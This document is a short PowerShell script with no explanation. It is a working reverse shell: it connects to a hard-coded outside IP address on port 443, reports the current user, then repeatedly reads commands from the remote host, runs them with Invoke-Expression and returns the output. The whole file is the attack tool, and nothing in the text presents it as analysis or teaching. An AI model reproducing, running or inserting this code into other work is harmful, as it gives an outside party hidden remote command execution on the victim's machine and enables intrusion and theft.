$ip = "178.170.220.14"
$port = 443

try {
    $t = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $s = $t.GetStream()
    $r = New-Object System.IO.StreamReader($s)
    $w = New-Object System.IO.StreamWriter($s)
    $w.AutoFlush = $true

    $w.WriteLine("--- Connected: $(whoami) ---")

    while($t.Connected) {
        $w.Write("PS > ")
        $c = $r.ReadLine()

        if ([string]::IsNullOrWhiteSpace($c)) { continue }

        try {
            $out = Invoke-Expression $c 2>&1 | Out-String
            if ($out) { $w.WriteLine($out) } else { $w.WriteLine(" ") }
        } catch {
            $w.WriteLine("Error: " + $_.Exception.Message)
        }
    }
} catch {
    Write-Host "Fatal Error: $($_.Exception.Message)" -ForegroundColor Red
    Start-Sleep -Seconds 5
}
